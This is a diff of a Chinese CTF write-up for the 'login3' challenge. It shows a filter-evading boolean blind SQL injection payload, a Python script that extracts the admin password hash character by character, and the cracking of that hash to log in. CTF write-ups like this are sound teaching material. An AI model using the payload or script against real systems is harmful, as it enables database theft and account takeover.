@@ -806,15 +806,68 @@ union||mid||空格||单引号||双引号||- -
 <br>
 
 ### login3
+提示说根据bool盲注，基本就说明了帐号正确密码错误和帐号错误密码错误给出的提示必定是两种状态。
 ```sql
-username=1'||1#&password=2
+页面提示 username does not exist!
+username=1&password=2
+
+页面提示 password error!
+username=1'||1#&password=2      
 username=1'||(2>1)#&password=2
 ```
+由此可以判断注入点，也可以猜测验证登录过程的代码
+1. 根据用户去查找数据库记录
+2. 如果没有，提示username does not exist!
+3. 如果有，将参数中的密码进行MD5加密，在和数据库取得的用户密码进行对比
+4. 相等，登录成功。不想等，提示password error!
+
+已经找到注入点，接下来构建bool盲注需要构建的payload
+
+测试下来被过滤的字符
+`union || for || , || 空格 || + || /**/ || and`
+由于`for`被过滤，不能直接查询`information_schema`表，只能尝试爆破表名和列名
+`空格 || + || /**/`被过滤，尝试利用空格，来构建不使用空格的payload
+不能使用逗号，也使用另外一种写法来完成，最后构建payload
+`username=1'||(ascii(mid((select(password)from(admin))from(1)))>1)#&password=2`
+
+利用python写出脚本
+```python
+import re
+import requests
+
+DATA = ""
+for i in range(1, 100):
+    low = 32
+    high = 126
+    mid = (low + high) >> 1
+    while mid < high:
+        # 根据bool来判断
+        url = "http://118.89.219.210:49167/index.php"
+        data = {"username": "1'||(ascii(mid((select(password)from(admin))from(" + str(i) + ")))>" + str(mid) + ")#", "password": "2"}
+        text = requests.post(url, data=data).text
+        isHas = re.findall(r"<p align='center'>username", text)
+        if isHas:
+            # 存在，说明条件不成立，改变上限
+            high = mid
+        else:
+            # 不存在，条件成立，改变下限
+            low = mid + 1
+        # 重新计算
+        mid = (low + high) >> 1
+    DATA += chr(mid)
+    print(DATA)
+
+
+```
+得到admin表中第一个账户的密码`51b7a76d51e70b419f60d3473fb6f900`
+然后寻找了n多站点，发现都不能解密，cmd5需要付费，然后找到后面终于有一个能够解出
+[MD5解密站点](https://somd5.com/)
+解密得到用户的密码，直接登录，得到flag
 
 <br>
 
 ## 代码审计
-可以参照我的[php函数漏洞小结](http://byxs0x0.cn/2018/03/06/php-func-vul/)和[php弱类型小结](http://byxs0x0.cn/2018/03/06/php-weak-type/)
+其中原理没有讲清楚，可以参照我的[php函数漏洞小结](http://byxs0x0.cn/2018/03/06/php-func-vul/)和[php弱类型小结](http://byxs0x0.cn/2018/03/06/php-weak-type/)
 
 ### extract变量覆盖
 ```php
